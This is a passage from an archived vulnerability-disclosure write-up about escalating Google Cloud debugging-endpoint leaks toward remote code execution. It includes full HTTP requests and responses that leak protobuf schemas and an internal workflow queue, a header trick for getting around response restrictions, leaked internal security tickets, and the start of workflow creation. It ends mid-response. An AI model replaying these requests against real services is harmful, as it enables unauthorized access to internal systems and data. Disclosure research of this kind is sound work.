@@ -1,0 +1,711 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>StubZero: $148,337 RCE in Google Cloud Production | rss-cache archive</title>
+    <style>
+      :root {
+        color-scheme: light;
+        --bg: #f6f2ea;
+        --card: #fffdfa;
+        --text: #1f2933;
+        --muted: #52606d;
+        --border: #d9cbb8;
+        --accent: #b05a33;
+      }
+      * { box-sizing: border-box; }
+      body {
+        margin: 0;
+        font-family: Georgia, "Iowan Old Style", "Palatino Linotype", serif;
+        color: var(--text);
+        background: linear-gradient(180deg, #fbf8f2 0%, var(--bg) 100%);
+      }
+      main {
+        max-width: 820px;
+        margin: 0 auto;
+        padding: 2.5rem 1.25rem 4rem;
+      }
+      article {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 20px;
+        padding: 1.5rem;
+      }
+      h1 {
+        margin-top: 0;
+        font-size: clamp(2rem, 4vw, 3rem);
+        line-height: 1.05;
+      }
+      .meta {
+        color: var(--muted);
+        margin-bottom: 1.2rem;
+      }
+      .links {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.75rem;
+        margin-bottom: 1.5rem;
+      }
+      .links a {
+        color: var(--accent);
+        text-decoration: none;
+      }
+      .summary {
+        border-left: 4px solid var(--border);
+        padding-left: 1rem;
+        color: var(--muted);
+        margin-bottom: 1.5rem;
+      }
+      img {
+        max-width: 100%;
+        height: auto;
+      }
+      pre {
+        white-space: pre-wrap;
+        overflow-wrap: anywhere;
+      }
+      a {
+        color: var(--accent);
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <article>
+        <h1>StubZero: $148,337 RCE in Google Cloud Production</h1>
+        <div class="meta">Brutecat · Research 2026-06-01T00:00:00Z</div>
+        <div class="links">
+          <a href="https://brutecat.com/articles/google-cloud-rce">Original article</a>
+          <a href="https://ThinkPeace.github.io/rss-cache/archive/articles/brutecat-com/brutecat-com-468b9d8fb7371b1e.json">Archive JSON</a>
+          <a href="https://ThinkPeace.github.io/rss-cache/">rss-cache home</a>
+        </div>
+        <div class="summary">A chance Discord message, two missing pieces, and one hour before the window closed: From info leak to RCE on Google Cloud. Three months later, it happened again.</div>
+        <div class="content">
+          <p>What started as a debugging endpoint info leak escalated into full remote code execution on Google Cloud&#39;s production environment. Three months later, it happened again. This vulnerability was assigned <strong><a href="https://www.cve.org/CVERecord?id=CVE-2026-2031" target="_blank" rel="noopener noreferrer">CVE-2026-2031</a></strong>.</p>
+<p>This story starts with one of my automated fuzzing tools alerting me about the API <strong>cloudcrmipfrontend-pa.googleapis.com</strong>, as it was responding with status 200 to some suspicious endpoints. On further inspection, the API seems to have several public debugging endpoints:</p>
+<p><img src="/assets/google-cloud-rce/get_people_debug_endpoint.png" alt="" loading="lazy" /></p>
+<p><em>Screenshot from an internal API explorer tool I built for testing internal Google APIs from a <a href="/articles/decoding-google">discovery document</a></em></p>
+<h3 id="req2proto-as-a-service"><a class="anchor" href="#req2proto-as-a-service" aria-hidden="true">#</a>req2proto as a Service™</h3><p>Some of the endpoints like <code>GET /v1/integrationPlatform:listServicesByServer</code> seemed to always return internal server error. However, the endpoint <code>/v1/integrationPlatform:getProtoDefinition</code> seemed to return the proto definitions of <strong>any protobuf message in google3</strong> (google&#39;s internal source code monorepo), even for unrelated services like YouTube.</p>
+<p><strong>Request</strong></p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&amp;isEnum=false</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>&lt;redacted&gt;
+<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>SAPISIDHASH &lt;redacted&gt;
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://console.cloud.google.com
+<span class="hljs-attribute">X-Goog-Api-Key</span><span class="hljs-punctuation">: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE</code></pre><blockquote>
+<p>For authentication with this API, we are using Google&#39;s proprietary first-party authentication. This involves your Google account cookie header along with an <a href="https://gist.github.com/eyecatchup/2d700122e24154fdc985b7071ec7764a" target="_blank" rel="noopener noreferrer">Authorization header value calculated</a> using the <code>SAPISID</code> cookie as well as the whitelisted origin <strong><a href="https://console.cloud.google.com" target="_blank" rel="noopener noreferrer">https://console.cloud.google.com</a></strong></p>
+</blockquote>
+<p><strong>Response</strong></p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;protoDescriptor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;InnerTubeContext&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;field&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+      <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;client&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;LABEL_OPTIONAL&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;TYPE_MESSAGE&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;typeName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;.youtube.api.pfiinnertube.YoutubeApiInnertube.ClientInfo&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;jsonName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;client&quot;</span>
+      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;user&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;LABEL_OPTIONAL&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;TYPE_MESSAGE&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;typeName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;.youtube.api.pfiinnertube.YoutubeApiInnertube.UserInfo&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;jsonName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;user&quot;</span>
+      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+...</code></pre><p>This was massive, because in Google, everything is proto. All APIs are defined internally as gRPC services using protobuf, and this would essentially allow for disclosing the request/response body of any endpoint, which for a blackbox target like Google is a gold mine.</p>
+<p>In the past, I had developed a tool <a href="https://github.com/ddd/req2proto" target="_blank" rel="noopener noreferrer">req2proto</a> for this purpose, however that tool was limited only to finding the request body proto, not the response body, and it was also with the assumption that the API supported JSPB (application/json+protobuf) which most APIs didn&#39;t. As a joke, my friends and I started referring to this endpoint from then onwards as &quot;req2proto as a service&quot;, since it was quite literally a hosted, much more powerful version of the tool.</p>
+<p>Before probing further with this endpoint, I checked if there were any other endpoints leaking information.</p>
+<h3 id="leaking-internal-workflow-execution-queue"><a class="anchor" href="#leaking-internal-workflow-execution-queue" aria-hidden="true">#</a>Leaking internal workflow execution queue</h3><p><img src="/assets/google-cloud-rce/list_quota_queue_endpoint.jpg" alt="" loading="lazy" /></p>
+<p>Initially, without any query parameters set, this endpoint was just returning <strong>INVALID_ARGUMENT</strong> errors. Trying filters like <code>*</code> also didn&#39;t work. However, from past experience, these filter parameters usually allow any filtering in accordance with <a href="https://google.aip.dev/160" target="_blank" rel="noopener noreferrer">https://google.aip.dev/160</a></p>
+<p>As such, upon trying <code>client_id&gt;&quot;123&quot;</code> as the filter, I got an interesting response:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">500</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Failed to convert server response to JSON&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;INTERNAL&quot;</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre><p>It looks like whatever response it was trying to give to me didn&#39;t have a JSON mapping. However, Google APIs support changing the response content-type via the standard <code>?alt=</code> parameter. For instance, <code>?alt=proto</code> would return the output in protobuf.</p>
+<p>The only issue is that since we are using Google&#39;s proprietary first-party auth for authentication (Cookie and Authorization header), we have to send requests to the hostname <strong>cloudcrmipfrontend-pa.clients6.google.com</strong> instead of <code>cloudcrmipfrontend-pa.googleapis.com</code>, but Google does not allow raw proto responses to requests sent to *.google.com:</p>
+<pre><code class="hljs language-http">Request unsafe for browser client domain: cloudcrmipfrontend-pa.clients6.google.com</code></pre><p>Thankfully, there&#39;s a way around this. We can use the header <code>X-Goog-Encode-Response-If-Executable: base64</code> and this would get the response back in base64 instead of binary data:</p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&amp;alt=proto</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>&lt;redacted&gt;
+<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>SAPISIDHASH &lt;redacted&gt;
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://console.cloud.google.com
+<span class="hljs-attribute">X-Goog-Api-Key</span><span class="hljs-punctuation">: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
+<span class="hljs-attribute">X-Goog-Encode-Response-If-Executable</span><span class="hljs-punctuation">: </span>base64</code></pre><p>The API returned a large base64 protobuf response. Using the proto definition leak from earlier to retrieve the schema for <code>ListQuotaQueueResponse</code>, I was able to decode it properly which revealed that this was some sort of internal workflow execution queue, which included workflows syncing data from <a href="https://cloud.google.com/spanner" target="_blank" rel="noopener noreferrer">Spanner</a> to Salesforce:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;queue_items&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+    <span class="hljs-punctuation">{</span>
+      <span class="hljs-attr">&quot;queued_request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">&quot;queued_request_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;75a885e2-c611-43f7-b4e2-ae0d87bae789&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;client_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;default&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;workflow_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;WriteToSfdc&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;priority&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CRITICAL&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;received_timestamp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1763057385562</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;event_execution_info_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;615cd9a9-9c0e-46ec-90df-91ee42ec9c37&quot;</span>
+      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;event_execution_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">&quot;client_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;default&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;workflow_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;WriteToSfdc&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;trigger_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api_trigger/WriteToSfdc&quot;</span><span class="hljs-punctuation">,</span>
+        ...
+        <span class="hljs-attr">&quot;type_url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;type.googleapis.com/enterprise.crm.datalayer.WriteToSfdcRequest&quot;</span><span class="hljs-punctuation">,</span>
+        ...
+        <span class="hljs-attr">&quot;sfdc_object&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+          <span class="hljs-attr">&quot;vector_account&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+            <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;001Kf00000wjeK3IAI&quot;</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">&quot;due_diligence__c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Pending&quot;</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">&quot;due_diligence_sub_status__c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1. PENDING DD - Initial Submission Review&quot;</span>
+            ...</code></pre><p>Shortly after this, I filed a report for these vulnerabilities. Just a few hours later, it was marked as P0/S0 and got a 🎉 <strong>Nice catch!</strong></p>
+<h3 id="escalating-further"><a class="anchor" href="#escalating-further" aria-hidden="true">#</a>Escalating further?</h3><p>After all this, I was convinced there was likely more to be found in this API, so I started looking at all the workflow endpoints. The API seemed to be related to Google Cloud&#39;s <a href="https://cloud.google.com/application-integration" target="_blank" rel="noopener noreferrer">Application Integration</a>.</p>
+<p>It allows you to define a &quot;workflow&quot;, that you could supply with a <code>triggerConfig</code> for what should trigger the workflow, as well as <code>taskConfig</code> for what task should be triggered. The most interesting part was that looking at the discovery document, there seemed to be hints of a task called <code>GenericStubbyTypedTask</code> that you seemingly could configure the workflow to execute, which instantly set off red flags. </p>
+<pre><code class="hljs language-json"><span class="hljs-attr">&quot;EnterpriseCrmEventbusProtoTaskUiModuleConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Task author would use this type to configure a config module.&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;EnterpriseCrmEventbusProtoTaskUiModuleConfig&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;moduleId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+      <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ID of the config module.&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;enum&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        ...
+        <span class="hljs-string">&quot;RPC_TYPED&quot;</span><span class="hljs-punctuation">,</span>
+        ...
+      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;enumDescriptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        ...
+        <span class="hljs-string">&quot;Configures a GenericStubbyTypedTask.&quot;</span><span class="hljs-punctuation">,</span>
+        ...
+      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-punctuation">}</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span></code></pre><p>From <a href="https://sre.google/sre-book/production-environment/" target="_blank" rel="noopener noreferrer">Google's SRE book</a>:</p>
+<blockquote>
+<p>All of Google’s services communicate using a Remote Procedure Call (RPC) infrastructure named Stubby; an open source version, gRPC, is available. Often, an RPC call is made even when a call to a subroutine in the local program needs to be performed. This makes it easier to refactor the call into a different server if more modularity is needed, or when a server’s codebase grows.</p>
+</blockquote>
+<p>From my understanding on how this works, Borg (aka Google Production) follows a <a href="https://cloud.google.com/docs/security/beyondprod" target="_blank" rel="noopener noreferrer">security model</a> where every borgtask service has its own identity. When you send a request to a <code>*.googleapis.com</code> endpoint, the frontend service makes Stubby calls to backend services using its own prod service identity, while carrying your end-user context in a security ticket. If the ticket contains your Gaia user ID, backend services authorize the request as that user. Here are two examples of leaked security tickets from Google API error responses:</p>
+<details><summary>Without authentication (anonymous)</summary><pre><code>com.google.apps.framework.auth.IamPermissionDeniedException:
+  IAM authority does not have the permission &#39;cloudprivatecatalog.targets.get&#39;
+  required for action PrivateCatalogV1Beta1-SearchProducts
+  on resource &#39;&#39;.<p>Explanation:</p>
+<p>Security Context:<br>  ValidatedSecurityContextWithSystemAuthorizationPolicy<br>    delegate = ValidatedSecurityContextWithRegistryHandle<br>      delegate = ValidatedSecurityContextWithObligations<br>        delegate = ValidatedIamSecurityContext<br>          user  = anonymous<br>          creds = EndUserCreds<br>            loggable_credential {<br>              type: SERVICE_CONTROL_TOKEN<br>            }<br>            access_assertion: ANONYMOUS<br>          peer =<br>            protocol                = loas<br>            psp_version             = 0<br>            level                   = strong_privacy_and_integrity<br>            host                    = jxcbu6.prod.google.com<br>            is_authenticated_host   = false<br>            role                    = cloud-commerce-catalog<br>            user                    = cloud-boq-clientapi-catalog<br>            is_delegated            = true<br>            jobname_chosen_by_user  = prod.cloud-commerce-catalog<br>          InternalIAMIdentity<br>            log = originator {<br>              scope: MDB_USER<br>              mdb_user {<br>                user_name: &quot;cloud-boq-clientapi-catalog&quot;<br>              }<br>            }</code></pre></details></p>
+<details><summary>With first-party authentication (Gaia user)</summary><pre><code>com.google.apps.framework.auth.IamPermissionDeniedException:
+  IAM authority does not have the permission &#39;resourcemanager.projects.get&#39;
+  required for action GetServiceAccessStatus
+  on resource &#39;projects/613988253758&#39;.<p>Explanation:</p>
+<p>Security Context:<br>  ValidatedSecurityContextWithCloudPolicyChecks<br>    delegate = ValidatedSecurityContextWithCpeContext<br>      delegate = ValidatedSecurityContextWithObligations<br>        delegate = ValidatedSecurityContextWithRegistryHandle<br>          delegate = ContextWithGaiaMintToken<br>            delegate = ValidatedIamSecurityContext<br>              user  = gaiauser/0xaa22527678<br>              creds = EndUserCreds<br>                loggable_credential {<br>                  type: GAIA_MINT<br>                  loggable_gaia_mint { }<br>                }<br>                loggable_credential {<br>                  type: SERVICE_CONTROL_TOKEN<br>                }<br>              peer =<br>                protocol                = loas<br>                psp_version             = 0<br>                level                   = strong_privacy_and_integrity<br>                host                    = pjf8.prod.google.com<br>                is_authenticated_host   = false<br>                role                    = commerceorggovernance-clh<br>                gaiaId                  = 640201889743<br>                security_realm          = campus-dls<br>                is_delegated            = false<br>                borgcell                = pj<br>                task_id                 = 2<br>                user_type               = MDB_USER_NON_PERSON<br>                jobname_chosen_by_user  = prod.commerceorggovernance-clh<br>              InternalIAMIdentity<br>                log = originator {<br>                  scope: GAIA_USER<br>                  gaia_user {<br>                    user_id: 730720269944<br>                  }<br>                }</code></pre></details></p>
+<p>In both cases, the <code>peer</code> block shows the prod service identity making the internal Stubby call. The difference is in the end-user context: the first ticket is <code>ANONYMOUS</code>, while the second carries a <code>GAIA_MINT</code> credential (when you use cookie or bearer authentication in Google, it&#39;s converted to a standard UberMint token which contains an embedded GaiaMint) meaning the backend authorizes the request as that Gaia user. This is so that a call to lets say <code>/ContactsService.ListContacts</code> only returns contacts for that authorized user.</p>
+<p>If we can perform arbitrary Stubby queries as the integration platform&#39;s prod service identity, this would allow us to access a wide variety of RPCs ranging from sensitive user data to code execution depending on the privileges of the prod user. Hence, Google considers this as a massive increase in attack surface and hence <a href="https://www.ezequiel.tech/p/36k-google-app-engine-rce.html" target="_blank" rel="noopener noreferrer">considers this an RCE</a>.</p>
+<p>Often times, even if you can get code execution in a borglet, unless you&#39;re particularly interested in what data is processed locally, the main impact is actually access to all of production via Stubby RPCs.</p>
+<p>But what actually gates <em>which</em> RPCs you can call from a stolen Stubby primitive? Every Stubby service in Google has a defined <code>RpcSecurityPolicy</code> with a per-method allowlist. Here&#39;s a real one example from the Cloud SQL Speckle Boss process:</p>
+<pre><code class="hljs language-yaml"><span class="hljs-string">mapping</span> {
+  <span class="hljs-attr">rpc_method:</span> <span class="hljs-string">&quot;/SaasActuation.UpdateInstance&quot;</span>
+  <span class="hljs-attr">rpc_method:</span> <span class="hljs-string">&quot;/MaintenancePolicyService.CreateMaintenancePolicy&quot;</span>
+  <span class="hljs-string">...</span>
+  <span class="hljs-string">authentication_policy</span> {
+    <span class="hljs-string">creds_policy</span> {
+      <span class="hljs-string">rules</span> {
+        <span class="hljs-attr">permissions:</span> <span class="hljs-string">&quot;auth.creds.useProdUserEUC&quot;</span>
+        <span class="hljs-attr">action:</span> <span class="hljs-string">ALLOW</span>
+        <span class="hljs-attr">in:</span> <span class="hljs-string">&quot;mdb:zamm-exe-3-cloud-sql--default-policy&quot;</span>
+        <span class="hljs-attr">in:</span> <span class="hljs-string">&quot;user:speckle-tool-proxy@prod.google.com&quot;</span>
+      }
+      <span class="hljs-string">rules</span> {
+        <span class="hljs-attr">permissions:</span> <span class="hljs-string">&quot;auth.creds.useLOAS&quot;</span>
+        <span class="hljs-attr">action:</span> <span class="hljs-string">ALLOW</span>
+        <span class="hljs-attr">in:</span> <span class="hljs-string">&quot;allUsers&quot;</span>
+      }
+    }
+  }
+  <span class="hljs-attr">authorization_mode:</span> <span class="hljs-string">MANUAL_IAM</span>
+  <span class="hljs-attr">permission_to_check:</span> <span class="hljs-string">&quot;cloudsql.instances.rollout&quot;</span>
+}</code></pre><p>Each <code>mapping</code> block lists a set of RPC methods and declares which callers are allowed to invoke them under which credential type. Based on my understanding, <code>auth.creds.useLOAS</code> means &quot;any borgtask can call this with its own LOAS identity&quot; while <code>auth.creds.useProdUserEUC</code> means &quot;only these specific MDB groups are allowed to forward a Gaia end-user identity (i.e. an UberMint token) into the call&quot;.</p>
+<blockquote>
+<p>LOAS (Low Overhead Authentication System) is Google&#39;s internal authentication &amp; encryption framework, see <a href="https://www.usenix.org/system/files/login/articles/login_winter16_05_cittadini.pdf" target="_blank" rel="noopener noreferrer">this paper</a> for more information</p>
+</blockquote>
+<p>The <code>permission_to_check</code> then tells the backend which IAM permission to enforce on whatever identity ends up resolved.</p>
+<p>So even with a stolen Stubby primitive, you don&#39;t actually get to call every RPC under the sun. You can only reach the ones whose <code>RpcSecurityPolicy</code> lets your peer identity through. Nevertheless, it is a massive increase in reachable attack surface.</p>
+<p>When I initially tried to create a workflow, I got the following <strong>INVALID_ARGUMENT</strong> error:</p>
+<p><strong>Request</strong></p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/v1/integrationPlatform:createDraftWorkflow</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>&lt;redacted&gt;
+<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>SAPISIDHASH &lt;redacted&gt;
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://console.cloud.google.com
+<span class="hljs-attribute">X-Goog-Api-Key</span><span class="hljs-punctuation">: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>197
+
+<span class="language-prolog">{
+  <span class="hljs-string">&quot;workflow&quot;</span>: {
+    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;my-new-workflow-test&quot;</span>,
+    <span class="hljs-string">&quot;origin&quot;</span>: <span class="hljs-string">&quot;UI&quot;</span>,
+    <span class="hljs-string">&quot;triggerConfigs&quot;</span>: [],
+    <span class="hljs-string">&quot;taskConfigs&quot;</span>: []
+  },
+  <span class="hljs-string">&quot;isNewWorkflow&quot;</span>: true
+}</span></code></pre><p><strong>Response</strong></p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">400</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Request contains an invalid argument.&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;INVALID_ARGUMENT&quot;</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre><blockquote>
+<p>Fun fact: If this request was sent from within Google&#39;s intranet, it would dump the full stack trace instead of just a generic error like this.</p>
+</blockquote>
+<p>I suspected that I was likely missing a required argument, possibly <strong>clientId</strong>. Remembering that the listQuotaQueue response from earlier had leaked <code>&quot;client_id&quot;: &quot;default&quot;</code>, I tried setting that as the <code>clientId</code>, and it worked:</p>
+<p><strong>Request</strong></p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/v1/integrationPlatform:createDraftWorkflow</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>&lt;redacted&gt;
+<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>SAPISIDHASH &lt;redacted&gt;
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://console.cloud.google.com
+<span class="hljs-attribute">X-Goog-Api-Key</span><span class="hljs-punctuation">: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>197
+
+<span class="language-prolog">{
+  <span class="hljs-string">&quot;workflow&quot;</span>: {
+    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;my-new-workflow-test&quot;</span>,
+    <span class="hljs-string">&quot;origin&quot;</span>: <span class="hljs-string">&quot;UI&quot;</span>,
+    <span class="hljs-string">&quot;clientId&quot;</span>: <span class="hljs-string">&quot;default&quot;</span>,
+    <span class="hljs-string">&quot;triggerConfigs&quot;</span>: [],
+    <span class="hljs-string">&quot;taskConfigs&quot;</span>: []
+  },
+  <span class="hljs-string">&quot;isNewWorkflow&quot;</span>: true
+}</span></code></pre><p><strong>Response:</strong></p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;workflow&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;workflowId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-new-workflow-test&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;origin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UI&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;creatorEmail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin@gvrptest.cry.dev&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;createdTime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2025-12-01T04:19:14.449503Z&quot;</span><span class="hljs-punctuation">,</span>
